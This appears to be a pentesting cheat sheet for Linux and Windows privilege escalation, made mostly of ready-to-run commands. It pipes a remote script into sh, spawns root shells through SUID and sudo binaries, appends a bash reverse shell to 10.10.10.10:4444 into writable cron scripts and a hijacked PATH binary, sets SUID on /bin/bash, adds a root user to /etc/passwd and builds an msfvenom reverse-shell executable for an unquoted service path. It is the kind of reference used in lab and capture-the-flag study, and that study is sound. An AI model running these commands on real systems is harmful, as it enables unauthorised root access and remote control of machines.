🐧 Linux Enumeration

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Interesting files
find / -name "*.txt" 2>/dev/null | grep -i pass
find / -perm -4000 2>/dev/null     # SUID files

⚡ Linux SUID/SGID

Find & Exploit SUID Binaries 
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Common exploitable SUID binaries — check GTFOBins for each
# https://gtfobins.github.io

# Example: /usr/bin/find with SUID
/usr/bin/find . -exec /bin/sh -p \; -quit

# Example: /usr/bin/vim with SUID
vim -c ':!/bin/sh'

# Example: /usr/bin/nmap (older versions)
nmap --interactive
nmap> !sh

👑 Linux Sudo

Sudo Privilege Abuse 
# Check sudo privileges
sudo -l

# If you see: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# If you see: (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# If you see: (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
# Then press: !bash

# LD_PRELOAD trick (if env_keep+=LD_PRELOAD in sudoers)
# Create malicious shared library and sudo any allowed binary

⏰ Linux Cron Jobs

Find & Exploit Cron Jobs 
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Watch for running processes (use pspy)
./pspy64

# If script is writable — inject reverse shell
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /path/to/cronjob.sh

# If directory is writable — create the script it calls
echo '#!/bin/bash' > /writable/path/script.sh
echo 'chmod +s /bin/bash' >> /writable/path/script.sh
chmod +x /writable/path/script.sh
# Wait for cron to run, then: /bin/bash -p

🔧 Linux Misc

Path Hijacking & Writable Files Linux 
# Check PATH
echo $PATH

# If script calls binary without full path (e.g. just "cat")
export PATH=/tmp:$PATH
echo '#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.10/4444 0>&1' > /tmp/cat
chmod +x /tmp/cat

# Check /etc/passwd is writable
ls -la /etc/passwd
# Generate password hash: openssl passwd -1 -salt salt newpassword
# Add new root user line to /etc/passwd

# Check capabilities
getcap -r / 2>/dev/null

⚙️ Windows Services

Unquoted Service Path Windows 
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# If path is: C:\Program Files\Vuln Service\service.exe
# Windows tries: C:\Program.exe → C:\Program Files\Vuln.exe → etc.
# Drop malicious binary in writable directory in that path
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o Program.exe
